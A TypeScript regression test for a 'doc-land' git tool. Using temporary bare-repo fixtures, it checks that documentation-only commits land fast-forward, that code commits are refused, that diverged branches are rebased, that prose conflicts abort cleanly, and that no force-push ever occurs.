// LOOP-57 regression: dev-loop doc-land must land PM's doc-only progress commits to
// origin/<defaultBranch> ff-only, refuse on non-doc paths, rebase when diverged, and
// downgrade push-guard reference findings (Canceled/Duplicate refs in prose) to WARN
// while hard-stopping on actual non-doc content. Bare-origin + clone harness (§15).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { openDb } from "../src/db.ts";
import { parseDirtyPaths } from "../src/doc-land.ts";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string): void => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const git = (dir: string, args: string[]): string =>
  execFileSync("git", ["-C", dir, "-c", "user.email=t@t", "-c", "user.name=t", ...args],
    { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();

// True iff <ref>:<path> exists (used to prove a rebased-past commit's file survived on origin).
const pathOnRef = (dir: string, ref: string, path: string): boolean => {
  try { execFileSync("git", ["-C", dir, "cat-file", "-e", `${ref}:${path}`], { stdio: "ignore" }); return true; }
  catch { return false; }
};

const run = (args: string[], wsRoot: string, extra?: Record<string, string>): { status: number; stdout: string; stderr: string } => {
  const r = spawnSync(process.execPath, [join(hubRoot, "src", "doc-land.ts"), ...args], {
    encoding: "utf8",
    cwd: wsRoot,
    env: { ...scrubFireEnv(), ...extra },
  });
  return { status: r.status ?? 1, stdout: r.stdout ?? "", stderr: r.stderr ?? "" };
};

const ROOT = mkdtempSync(join(tmpdir(), "dl-doc-land-"));
try {
  // ── Fixture: bare origin + clone with a proper workspace ─────────────────────────
  const origin = join(ROOT, "origin.git");
  const wsRoot = join(ROOT, "ws");
  const repoDir = join(wsRoot, "dev-loop");
  mkdirSync(origin, { recursive: true });
  mkdirSync(wsRoot, { recursive: true });

  execFileSync("git", ["init", "--bare", "-q", "-b", "main", origin]);
  execFileSync("git", ["clone", "-q", origin, repoDir]);

  // Initial baseline commit
  git(repoDir, ["commit", "--allow-empty", "-qm", "baseline"]);
  git(repoDir, ["push", "-qu", "origin", "main"]);

  // Workspace config with strategyDoc pointing to docs/STRATEGY.md
  const STRATEGY_PATH = "docs/STRATEGY.md";
  writeFileSync(join(wsRoot, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2,
    workspaceId: "test-doc-land",
    team: { key: "test", backend: "service", mode: "live", autonomy: "ask" },
    repos: { "dev-loop": { path: "dev-loop", remote: origin, landing: "pr" } },
    projects: { test: { repos: [{ ref: "dev-loop" }], strategyDoc: { path: STRATEGY_PATH } } },
  }, null, 2));
  mkdirSync(join(wsRoot, ".dev-loop", "locks"), { recursive: true });

  // Hub DB for push-guard reference findings
  const dbPath = join(wsRoot, ".dev-loop", "hub.db");
  const db = openDb(dbPath);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','test','Test','t')").run();
  const tk = (id: string, state: string): void => {
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,0,'[]','[]','pm','t','t')").run(id, "p", "t-" + id, state);
  };
  tk("TEST-1", "Canceled");
  db.close();

  // ── (a) Clean doc-only ahead → pushes ff-only; origin/main gains the commit ──────
  mkdirSync(join(repoDir, "docs"), { recursive: true });
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nInitial content.\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): initial LOOP-57 progress entry"]);
  const beforeSha = git(repoDir, ["rev-parse", "HEAD"]);

  const resA = run(["--repo", "dev-loop"], wsRoot);
  ok(resA.status === 0, `(a) clean doc-only → exits 0 (stderr: ${resA.stderr.trim().slice(0, 120)})`);
  const afterOriginSha = git(repoDir, ["rev-parse", "origin/main"]);
  ok(afterOriginSha === beforeSha, `(a) origin/main now contains the commit (${afterOriginSha.slice(0, 7)} === ${beforeSha.slice(0, 7)})`);
  ok(/landed/.test(resA.stdout), `(a) output says 'landed' (got: ${resA.stdout.trim()})`);

  // ── (b) A non-doc (code) file in the range → refuses; origin/main unchanged ──────
  const originShaBeforeB = git(repoDir, ["rev-parse", "origin/main"]);
  writeFileSync(join(repoDir, "non-doc-code.ts"), "// not a doc file\n");
  git(repoDir, ["add", "non-doc-code.ts"]);
  git(repoDir, ["commit", "-qm", "feat: some code change (NOT doc-only)"]);

  const resB = run(["--repo", "dev-loop"], wsRoot);
  ok(resB.status !== 0, `(b) non-doc path in range → exits non-zero (got ${resB.status})`);
  ok(/REFUSED|non-doc/.test(resB.stderr), `(b) output mentions REFUSED or non-doc (got: ${resB.stderr.trim().slice(0, 120)})`);
  ok(/non-doc-code\.ts/.test(resB.stderr), `(b) names the offending path (got: ${resB.stderr.trim().slice(0, 200)})`);
  const originShaAfterB = git(repoDir, ["rev-parse", "origin/main"]);
  ok(originShaAfterB === originShaBeforeB, `(b) origin/main is unchanged after refusal`);

  // Reset: drop the code commit, keep the doc state clean
  git(repoDir, ["reset", "--hard", "origin/main"]);

  // ── (c) origin/main advances under us → rebases doc commit + pushes ─────────────
  // Add a doc commit locally (a new archive file — no conflict with clone2's STRATEGY.md change)
  mkdirSync(join(repoDir, "docs", "strategy-archive"), { recursive: true });
  writeFileSync(join(repoDir, "docs", "strategy-archive", "2026-07.md"), "# Archive 2026-07\n");
  git(repoDir, ["add", "docs/strategy-archive/2026-07.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): archive entry — current state progress"]);

  // Simulate origin advancing: push from a separate clone (changing only STRATEGY.md, no conflict)
  const clone2 = join(ROOT, "clone2");
  execFileSync("git", ["clone", "-q", origin, clone2]);
  writeFileSync(join(clone2, "docs", "STRATEGY.md"), "# Strategy\n\nUpdated by another agent.\n");
  git(clone2, ["add", "docs/STRATEGY.md"]);
  git(clone2, ["commit", "-qm", "docs(strategy): other agent's progress entry"]);
  git(clone2, ["push", "-qu", "origin", "main"]);
  const originAdvancedSha = git(clone2, ["rev-parse", "HEAD"]);

  // Now local main has doc commit BEHIND origin (diverged — rebases required)
  const resC = run(["--repo", "dev-loop"], wsRoot);
  ok(resC.status === 0, `(c) diverged base → rebases + pushes (exits 0; stderr: ${resC.stderr.trim().slice(0, 120)})`);
  const originAfterC = git(repoDir, ["rev-parse", "origin/main"]);
  ok(originAfterC !== originAdvancedSha, `(c) origin/main advanced past the other agent's commit (new tip is the rebased archive entry)`);
  // The archive file from our doc commit should be on origin/main
  const archiveOnOrigin = (() => {
    try { return execFileSync("git", ["-C", repoDir, "ls-tree", "--name-only", "origin/main:docs/strategy-archive/"], { encoding: "utf8" }).trim(); }
    catch { return ""; }
  })();
  ok(/2026-07\.md/.test(archiveOnOrigin), `(c) rebased doc commit is on origin/main (archive file present)`);

  // Sync local to origin
  git(repoDir, ["fetch", "origin", "main"]);
  git(repoDir, ["reset", "--hard", "origin/main"]);

  // ── (d) Push rejected even after retry → blocked, NEVER a force-push ─────────────
  // Set a pre-receive hook on the bare repo that always rejects
  const hookDir = join(origin, "hooks");
  mkdirSync(hookDir, { recursive: true });
  writeFileSync(join(hookDir, "pre-receive"), "#!/bin/sh\necho 'hooks: reject all pushes for test (d)' >&2\nexit 1\n");
  execFileSync("chmod", ["+x", join(hookDir, "pre-receive")]);

  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nAnother update.\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): update for retry test"]);
  const originBeforeD = git(repoDir, ["rev-parse", "origin/main"]);

  const resD = run(["--repo", "dev-loop"], wsRoot);
  ok(resD.status !== 0, `(d) push rejected after retry → exits non-zero (got ${resD.status})`);
  ok(/BLOCKED|blocked/.test(resD.stderr), `(d) output mentions BLOCKED (got: ${resD.stderr.trim().slice(0, 200)})`);
  // Verify no force-push happened (origin/main is unchanged)
  const originAfterD = git(repoDir, ["rev-parse", "origin/main"]);
  ok(originAfterD === originBeforeD, `(d) origin/main unchanged after blocked retry — no force-push`);

  // Remove the hook for subsequent tests; abandon the blocked commit (it was never pushed)
  execFileSync("rm", [join(hookDir, "pre-receive")]);
  git(repoDir, ["reset", "--hard", "origin/main"]); // discard the blocked doc commit

  // ── (e) Doc-only commit whose SUBJECT cites a Canceled ticket → lands + warns ────
  // This is the e1177cd case: PM's running-log names CANCELED tickets (they're reportage)
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"),
    "# Strategy\n\nDecisions: TEST-1 (Canceled) — verify-fail noted in this lens entry.\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): trust-safety lens — TEST-1 verify-fail (TEST-1 Canceled)"]);
  const beforeE = git(repoDir, ["rev-parse", "HEAD"]);

  const resE = run(["--repo", "dev-loop"], wsRoot, { DEVLOOP_HUB_DB: dbPath });
  ok(resE.status === 0, `(e) canceled-ref commit lands (exits 0; stderr: ${resE.stderr.trim().slice(0, 120)})`);
  ok(/WARN|⚠️|downgraded|annotation/.test(resE.stdout), `(e) output mentions WARN/downgraded/annotation (got: ${resE.stdout.trim().slice(0, 200)})`);
  ok(/TEST-1/.test(resE.stdout), `(e) names the canceled ref in the annotation (got: ${resE.stdout.trim().slice(0, 200)})`);
  const afterOriginE = git(repoDir, ["rev-parse", "origin/main"]);
  ok(afterOriginE === beforeE, `(e) origin/main has the commit after landing`);
  ok(!/blocked|BLOCKED/.test(resE.stderr.toLowerCase()), `(e) not blocked — reference findings don't hard-stop`);

  // ── (f) Non-doc (passenger-class) commit in range → hard stop via step-1 assertion
  // A doc commit followed by a non-doc commit: step-1 catches the non-doc file, refuses.
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nFinal update.\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): final update"]);
  // Now add a non-doc (passenger-class) file to the same local branch
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nFinal update.\n");
  writeFileSync(join(repoDir, "some-code.ts"), "// passenger non-doc content\n");
  git(repoDir, ["add", "some-code.ts"]);
  git(repoDir, ["commit", "-qm", "chore: non-doc passenger commit sneaks in"]);
  const originBeforeF = git(repoDir, ["rev-parse", "origin/main"]);

  const resF = run(["--repo", "dev-loop"], wsRoot);
  ok(resF.status !== 0, `(f) non-doc passenger commit → hard stop (exits non-zero; got ${resF.status})`);
  ok(/REFUSED/.test(resF.stderr), `(f) output says REFUSED (step-1 catches it)`);
  ok(/some-code\.ts/.test(resF.stderr), `(f) names the offending path`);
  const originAfterF = git(repoDir, ["rev-parse", "origin/main"]);
  ok(originAfterF === originBeforeF, `(f) origin/main unchanged — nothing pushed`);

  // ── --dry-run: no mutations ────────────────────────────────────────────────────────
  // Reset to a clean doc-only state (some-code.ts was only committed locally, not on origin/main)
  git(repoDir, ["reset", "--hard", "origin/main"]);
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nDry-run test entry.\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): dry-run test"]);
  const originBeforeDry = git(repoDir, ["rev-parse", "origin/main"]);

  const resDry = run(["--repo", "dev-loop", "--dry-run"], wsRoot);
  ok(resDry.status === 0, `--dry-run exits 0 (stderr: ${resDry.stderr.trim()})`);
  ok(/dry-run/.test(resDry.stdout), `--dry-run output mentions 'dry-run'`);
  const originAfterDry = git(repoDir, ["rev-parse", "origin/main"]);
  ok(originAfterDry === originBeforeDry, `--dry-run: origin/main unchanged (nothing pushed)`);

  // ── (g) origin advances with a CODE commit while local has a doc-only commit → LANDS ─────────
  //   LOOP-119, the whole ticket: step-1's two-dot diff saw origin's own code file and named it
  //   PM's offender, refusing before the rebase. Three-dot (merge-base..HEAD) sees only OUR doc
  //   commit. Every prior origin-advance case (c) advanced origin with a DOC file, so the shipped
  //   suite never exercised a CODE divergence — the bug was invisible.
  git(repoDir, ["fetch", "origin", "main"]);
  git(repoDir, ["reset", "--hard", "origin/main"]);
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nPM progress while origin lands code.\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): PM progress entry (g)"]);
  // origin advances with a CODE commit pushed by another agent (clone2)
  git(clone2, ["fetch", "-q", "origin", "main"]);
  git(clone2, ["reset", "--hard", "origin/main"]);
  writeFileSync(join(clone2, "agent-code.ts"), "// another agent's CODE landing on origin/main\n");
  git(clone2, ["add", "agent-code.ts"]);
  git(clone2, ["commit", "-qm", "feat: another agent's code change (g)"]);
  git(clone2, ["push", "-qu", "origin", "main"]);
  // repoDir LEARNS about the code commit before doc-land runs — the real "behind 1 (code)" state
  // the two-dot diff mis-blames. Without this fetch the origin ref is stale and the bug is invisible.
  git(repoDir, ["fetch", "origin", "main"]);

  const resG = run(["--repo", "dev-loop"], wsRoot);
  ok(resG.status === 0, `(g) origin ahead with CODE + local doc-only → LANDS (exit 0; stderr: ${resG.stderr.trim().slice(0, 160)})`);
  ok(!/REFUSED|non-doc/.test(resG.stderr), `(g) does NOT refuse — no non-doc offender named (stderr: ${resG.stderr.trim().slice(0, 160)})`);
  ok(!/agent-code\.ts/.test(resG.stderr), `(g) the other agent's code path is never named as PM's offender`);
  git(repoDir, ["fetch", "origin", "main"]);
  ok(/PM progress while origin lands code/.test(git(repoDir, ["show", "origin/main:docs/STRATEGY.md"])),
    `(g) the doc commit is on origin/main (rebased + pushed)`);
  ok(pathOnRef(repoDir, "origin/main", "agent-code.ts"),
    `(g) the other agent's code commit is preserved on origin/main (rebased onto, not clobbered)`);

  // ── (h) same shape but the non-doc commit is LOCALLY authored → still REFUSED ─────────────────
  //   proves the three-dot change did NOT widen the fence: a locally-authored code commit is inside
  //   merge-base..HEAD and is still caught (LOOP-119 AC — the fence must survive the range change).
  git(repoDir, ["fetch", "origin", "main"]);
  git(repoDir, ["reset", "--hard", "origin/main"]);
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nPM progress (h).\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): PM progress entry (h)"]);
  writeFileSync(join(repoDir, "local-code.ts"), "// locally authored, never pushed to origin\n");
  git(repoDir, ["add", "local-code.ts"]);
  git(repoDir, ["commit", "-qm", "feat: locally authored code (h)"]);
  const originBeforeH = git(repoDir, ["rev-parse", "origin/main"]);

  const resH = run(["--repo", "dev-loop"], wsRoot);
  ok(resH.status !== 0, `(h) locally-authored code commit in range → still REFUSED (exit non-zero; got ${resH.status})`);
  ok(/REFUSED|non-doc/.test(resH.stderr), `(h) refusal message present (fence intact)`);
  ok(/local-code\.ts/.test(resH.stderr), `(h) names the locally-authored offending path (got: ${resH.stderr.trim().slice(0, 160)})`);
  ok(git(repoDir, ["rev-parse", "origin/main"]) === originBeforeH, `(h) origin/main unchanged after refusal`);

  // ── (j) LOOP-118: a REAL prose conflict on the same strategyDoc line → the rebase fails, doc-land
  //   ABORTS it, and leaves the SHARED checkout clean (not wedged mid-rebase) for every other agent.
  git(repoDir, ["fetch", "origin", "main"]);
  git(repoDir, ["reset", "--hard", "origin/main"]);
  // a shared baseline both sides diverge from
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nintro\nSHARED-LINE-base\nouttro\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): conflict baseline (j)"]);
  git(repoDir, ["push", "-qu", "origin", "main"]);
  // local edits the shared line one way (unpushed)
  writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nintro\nSHARED-LINE-local\nouttro\n");
  git(repoDir, ["add", "docs/STRATEGY.md"]);
  git(repoDir, ["commit", "-qm", "docs(strategy): local edit to shared line (j)"]);
  // clone2 edits the SAME line differently and pushes FIRST
  git(clone2, ["fetch", "-q", "origin", "main"]);
  git(clone2, ["reset", "--hard", "origin/main"]);
  writeFileSync(join(clone2, "docs", "STRATEGY.md"), "# Strategy\n\nintro\nSHARED-LINE-remote\nouttro\n");
  git(clone2, ["add", "docs/STRATEGY.md"]);
  git(clone2, ["commit", "-qm", "docs(strategy): other agent edit to shared line (j)"]);
  git(clone2, ["push", "-qu", "origin", "main"]);
  git(repoDir, ["fetch", "origin", "main"]);

  const resJ = run(["--repo", "dev-loop"], wsRoot);
  ok(resJ.status !== 0, `(j) genuine prose conflict → exits non-zero (got ${resJ.status})`);
  ok(/conflict|reconcile/i.test(resJ.stderr), `(j) BLOCKED message explains the conflict + manual reconcile (got: ${resJ.stderr.trim().slice(0, 200)})`);
  ok(!existsSync(join(repoDir, ".git", "rebase-merge")) && !existsSync(join(repoDir, ".git", "rebase-apply")),
    `(j) no .git/rebase-merge or rebase-apply left behind — the shared checkout is NOT wedged`);
  const branchJ = (() => { try { return git(repoDir, ["branch", "--show-current"]); } catch { return "(detached)"; } })();
  ok(branchJ === "main", `(j) checkout restored to 'main', not left detached mid-rebase (got: '${branchJ}')`);
  // a SECOND invocation must handle it cleanly too — not fail from an already-wedged state
  const resJ2 = run(["--repo", "dev-loop"], wsRoot);
  ok(!existsSync(join(repoDir, ".git", "rebase-merge")) && !existsSync(join(repoDir, ".git", "rebase-apply")),
    `(j) a second doc-land also leaves NO rebase state — not wedged from the first (LOOP-118 outage gone)`);
  ok(resJ2.status !== 0 && /conflict|reconcile/i.test(resJ2.stderr),
    `(j) the second run reports the same conflict from a CLEAN state, not "rebase failed" from a broken one`);
  git(repoDir, ["fetch", "origin", "main"]);
  git(repoDir, ["reset", "--hard", "origin/main"]);

  // ── (k) LOOP-217 AC1/AC2/AC3: unmerged index entry on a non-doc path → names the real blocker ──
  // State: both repoDir and origin at same commit (after j's cleanup).
  // Setup: local doc commit + origin moves ahead via clone2 (so behind>0 → preflight runs).
  {
    writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nProgress k (LOOP-217).\n");
    git(repoDir, ["add", "docs/STRATEGY.md"]);
    git(repoDir, ["commit", "-qm", "docs(strategy): progress k (LOOP-217)"]);

    // Advance origin via clone2 with a code commit (makes behind=1 in repoDir → preflight runs)
    git(clone2, ["fetch", "-q", "origin", "main"]);
    git(clone2, ["reset", "--hard", "origin/main"]);
    mkdirSync(join(clone2, "hub", "src"), { recursive: true });
    writeFileSync(join(clone2, "hub", "src", "code-k.ts"), "// code k\n");
    git(clone2, ["add", "hub/src/code-k.ts"]);
    git(clone2, ["commit", "-qm", "fix: code k (LOOP-217 test)"]);
    git(clone2, ["push", "-qu", "origin", "main"]);
    git(repoDir, ["fetch", "-q", "origin", "main"]);

    // Create an unmerged index entry for a non-doc path (simulates a prior failed merge/rebase)
    const mkBlob = (content: string): string =>
      spawnSync("git", ["-C", repoDir, "hash-object", "-w", "--stdin"],
        { input: content, encoding: "utf8", stdio: ["pipe", "pipe", "ignore"] }).stdout.trim();
    const blob1 = mkBlob("// base\n");
    const blob2 = mkBlob("// ours\n");
    const blob3 = mkBlob("// theirs\n");
    mkdirSync(join(repoDir, "hub", "src"), { recursive: true });
    spawnSync("git", ["-C", repoDir, "update-index", "--index-info"],
      { input: `100644 ${blob1} 1\thub/src/doctor.ts\n100644 ${blob2} 2\thub/src/doctor.ts\n100644 ${blob3} 3\thub/src/doctor.ts\n`,
        encoding: "utf8", stdio: ["pipe", "pipe", "ignore"] });

    const resK = run(["--repo", "dev-loop"], wsRoot);
    ok(resK.status !== 0, `(k) unmerged index entry → exits non-zero (LOOP-217)`);
    ok(/hub\/src\/doctor\.ts/.test(resK.stderr), `(k) names the unmerged non-doc path (LOOP-217)`);
    ok(!/prose merge|reconcile.*hand|must be reconciled/i.test(resK.stderr),
      `(k) does NOT blame a prose conflict on a non-doc unmerged path (LOOP-217)`);
  }
  git(repoDir, ["reset", "--hard", "origin/main"]);

  // ── (l) LOOP-217 AC6: dirty working tree (staged uncommitted changes) waits then blocks ──
  // Uses DEVLOOP_DOCLAND_DIRTY_TIMEOUT_MS=2000 so the test completes in ~2s, not 30s.
  {
    writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nProgress l (LOOP-217).\n");
    git(repoDir, ["add", "docs/STRATEGY.md"]);
    git(repoDir, ["commit", "-qm", "docs(strategy): progress l (LOOP-217)"]);

    // Advance origin via clone2 again (so behind=1 → preflight runs)
    git(clone2, ["fetch", "-q", "origin", "main"]);
    git(clone2, ["reset", "--hard", "origin/main"]);
    mkdirSync(join(clone2, "hub", "src"), { recursive: true });
    writeFileSync(join(clone2, "hub", "src", "code-l.ts"), "// code l\n");
    git(clone2, ["add", "hub/src/code-l.ts"]);
    git(clone2, ["commit", "-qm", "fix: code l (LOOP-217 test)"]);
    git(clone2, ["push", "-qu", "origin", "main"]);
    git(repoDir, ["fetch", "-q", "origin", "main"]);

    // Create staged (uncommitted) change on a non-doc path — won't self-clear, simulates a wedge
    mkdirSync(join(repoDir, "hub", "src"), { recursive: true });
    writeFileSync(join(repoDir, "hub", "src", "dirty-l.ts"), "// dirty\n");
    git(repoDir, ["add", "hub/src/dirty-l.ts"]);  // staged but not committed

    // LOOP-325 SUPERSEDES LOOP-217's dirty-tree BLOCK for this population. LOOP-217 was right that a
    // dirty tree must not be mislabelled as a prose conflict; it was wrong to make an unrelated path
    // block the land at all. PM's strategy-doc commit sat unlandable for two fires while the doc
    // itself was clean and the shared checkout cycled 7–9 unrelated dirty files — a tree that is
    // dirty by design is a wait that never ends.
    //
    // The rebase now happens in an ISOLATED WORKTREE, so the land completes and those edits survive.
    // LOOP-217 AC1 (unmerged index blocks immediately) is unchanged and asserted at (k).
    const dirtyBefore = readFileSync(join(repoDir, "hub", "src", "dirty-l.ts"), "utf8");
    const t0 = Date.now();
    const resL = run(["--repo", "dev-loop"], wsRoot, { DEVLOOP_DOCLAND_DIRTY_TIMEOUT_MS: "2000" });
    const elapsed = Date.now() - t0;
    ok(resL.status === 0, `(l) LOOP-325 AC1: an unrelated dirty path no longer blocks the land (status ${resL.status}: ${resL.stderr.slice(0, 160)})`);
    ok(elapsed < 2000, `(l) LOOP-325: …and it does not WAIT on a tree that is dirty by design (${elapsed}ms)`);
    ok(readFileSync(join(repoDir, "hub", "src", "dirty-l.ts"), "utf8") === dirtyBefore,
      "(l) LOOP-325 AC2: the unrelated modification survives BYTE-IDENTICAL — no stash, no checkout, no add");
    ok(git(repoDir, ["status", "--porcelain", "--untracked-files=no"]).includes("dirty-l.ts"),
      "(l) LOOP-325 AC2: …and is still uncommitted, exactly as the fire left it");
    ok(git(repoDir, ["rev-parse", "--abbrev-ref", "HEAD"]) === "main",
      "(l) LOOP-325 AC3: the shared checkout is left on its normal branch, never detached");
    ok(!existsSync(join(repoDir, ".git", "rebase-merge")) && !existsSync(join(repoDir, ".git", "rebase-apply")),
      "(l) LOOP-325 AC3: …with no rebase in progress");
    ok(git(repoDir, ["rev-parse", "main"]) === git(repoDir, ["rev-parse", "origin/main"]),
      "(l) LOOP-325 AC3: …and local main is NOT diverged from origin/main after the land");
    ok(!git(repoDir, ["worktree", "list"]).includes("docland"),
      "(l) LOOP-325: the isolated worktree is removed — leaving one behind is the LOOP-132 defect");

    // AC4 — the DOC itself dirty must STILL refuse. That is an unlanded edit, and landing around it
    // would silently drop someone's work. Distinct message from the unmerged-index wedge (k).
    {
      // Start from a clean base: (l)'"'"'s assertions have all run, and its leftover code files would
      // otherwise trip Step 1'"'"'s docs-only path assertion before this check is ever reached.
      git(repoDir, ["reset", "--hard", "origin/main"]);
      const docAbs = join(repoDir, "docs", "STRATEGY.md");
      const before = readFileSync(docAbs, "utf8");
      // A LOCAL doc commit to land …
      writeFileSync(docAbs, before + "\ncommitted l2 edit\n");
      git(repoDir, ["add", "docs/STRATEGY.md"]);
      git(repoDir, ["commit", "-qm", "docs(strategy): l2 (LOOP-325 test)"]);
      // … and origin moving ahead, so the rebase preflight actually runs.
      git(clone2, ["fetch", "-q", "origin", "main"]);
      git(clone2, ["reset", "--hard", "origin/main"]);
      writeFileSync(join(clone2, "hub", "src", "code-l2.ts"), "// code l2\n");
      git(clone2, ["add", "hub/src/code-l2.ts"]);
      git(clone2, ["commit", "-qm", "fix: code l2 (LOOP-325 test)"]);
      git(clone2, ["push", "-qu", "origin", "main"]);
      git(repoDir, ["fetch", "-q", "origin", "main"]);
      // …then an UNCOMMITTED edit on top of the doc: the unlanded work AC4 protects.
      const committed = readFileSync(docAbs, "utf8");
      writeFileSync(docAbs, committed + "\nAN UNCOMMITTED DOC EDIT\n");
      const resDoc = run(["--repo", "dev-loop"], wsRoot, { DEVLOOP_DOCLAND_DIRTY_TIMEOUT_MS: "2000" });
      ok(resDoc.status !== 0, `(l2) LOOP-325 AC4: a dirty strategyDoc still REFUSES (status ${resDoc.status})`);
      ok(/unlanded doc edit|uncommitted changes/.test(resDoc.stderr),
        `(l2) LOOP-325 AC4: …naming it as an unlanded edit (${resDoc.stderr.slice(-180)})`);
      ok(!/unmerged index/.test(resDoc.stderr),
        "(l2) LOOP-325 AC4: …with a message DISTINCT from the LOOP-217 unmerged-index refusal");
      ok(readFileSync(docAbs, "utf8").includes("AN UNCOMMITTED DOC EDIT"),
        "(l2) LOOP-325 AC4: …and the edit is untouched — refusing must not discard it either");
      git(repoDir, ["checkout", "-q", "--", "docs/STRATEGY.md"]);
      git(repoDir, ["reset", "--hard", "origin/main"]);
    }
  }
  git(repoDir, ["reset", "--hard", "origin/main"]);

  // ── (j2) LOOP-217 AC2: genuine doc prose conflict still emits the prose-merge message ──
  // (Regression guard: the AC1/AC6 preflight must not suppress the genuine doc message.)
  // Reuses the conflict state already set up in (j) by re-running the same fixture.
  {
    // Reset both sides to a new shared baseline
    const j2Base = "# Strategy\n\nintro\nSHARED-BASE-j2\nouttro\n";
    writeFileSync(join(repoDir, "docs", "STRATEGY.md"), j2Base);
    git(repoDir, ["add", "docs/STRATEGY.md"]);
    git(repoDir, ["commit", "-qm", "docs(strategy): j2 baseline"]);
    git(repoDir, ["push", "-qu", "origin", "main"]);

    // Local diverges on the shared line
    writeFileSync(join(repoDir, "docs", "STRATEGY.md"), "# Strategy\n\nintro\nSHARED-BASE-j2-local\nouttro\n");
    git(repoDir, ["add", "docs/STRATEGY.md"]);
    git(repoDir, ["commit", "-qm", "docs(strategy): j2 local edit"]);

    // clone2 diverges on the same line and pushes first
    git(clone2, ["fetch", "-q", "origin", "main"]);
    git(clone2, ["reset", "--hard", "origin/main"]);
    writeFileSync(join(clone2, "docs", "STRATEGY.md"), "# Strategy\n\nintro\nSHARED-BASE-j2-remote\nouttro\n");
    git(clone2, ["add", "docs/STRATEGY.md"]);
    git(clone2, ["commit", "-qm", "docs(strategy): j2 remote edit"]);
    git(clone2, ["push", "-qu", "origin", "main"]);
    git(repoDir, ["fetch", "origin", "main"]);

    const resJ2 = run(["--repo", "dev-loop"], wsRoot);
    ok(resJ2.status !== 0, `(j2) genuine doc conflict → exits non-zero (LOOP-217 AC2/AC4 guard)`);
    ok(/conflict|reconcile/i.test(resJ2.stderr),
      `(j2) genuine doc conflict still emits prose-merge wording (AC2 guard — LOOP-217)`);
  }
  git(repoDir, ["fetch", "origin", "main"]);
  git(repoDir, ["reset", "--hard", "origin/main"]);

  // ── (i) LOOP-119 Fix 2: a non-'main' defaultBranch (trunk) resolves via effectiveRepo + lands ──
  //   proves the hardcoded "main" is gone — doc-land reads repo.defaultBranch (§19 fallback chain).
  {
    const originT = join(ROOT, "origin-trunk.git");
    const wsT = join(ROOT, "ws-trunk");
    const repoT = join(wsT, "dev-loop");
    mkdirSync(originT, { recursive: true });
    mkdirSync(wsT, { recursive: true });
    execFileSync("git", ["init", "--bare", "-q", "-b", "trunk", originT]);
    execFileSync("git", ["clone", "-q", originT, repoT]);
    git(repoT, ["commit", "--allow-empty", "-qm", "baseline"]);
    git(repoT, ["push", "-qu", "origin", "trunk"]);
    writeFileSync(join(wsT, "dev-loop.json"), JSON.stringify({
      schemaVersion: 2, workspaceId: "test-doc-land-trunk",
      team: { key: "test", backend: "service", mode: "live", autonomy: "ask", git: { defaultBranch: "trunk" } },
      repos: { "dev-loop": { path: "dev-loop", remote: originT, landing: "pr" } },
      projects: { test: { repos: [{ ref: "dev-loop" }], strategyDoc: { path: "docs/STRATEGY.md" } } },
    }, null, 2));
    mkdirSync(join(wsT, ".dev-loop", "locks"), { recursive: true });
    // push-guard opens the hub DB; create it (empty) so its ticket query has a schema to read.
    const dbT = openDb(join(wsT, ".dev-loop", "hub.db"));
    dbT.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','test','Test','t')").run();
    dbT.close();
    mkdirSync(join(repoT, "docs"), { recursive: true });
    writeFileSync(join(repoT, "docs", "STRATEGY.md"), "# Strategy (trunk)\n\nprogress on a non-main default branch\n");
    git(repoT, ["add", "docs/STRATEGY.md"]);
    git(repoT, ["commit", "-qm", "docs(strategy): progress on trunk (i)"]);
    const beforeI = git(repoT, ["rev-parse", "HEAD"]);

    const resI = run(["--repo", "dev-loop"], wsT);
    ok(resI.status === 0, `(i) non-main defaultBranch (trunk) → lands (exit 0; stderr: ${resI.stderr.trim().slice(0, 160)})`);
    ok(git(repoT, ["rev-parse", "origin/trunk"]) === beforeI, `(i) origin/trunk has the commit — defaultBranch honoured, no hardcoded 'main'`);
  }

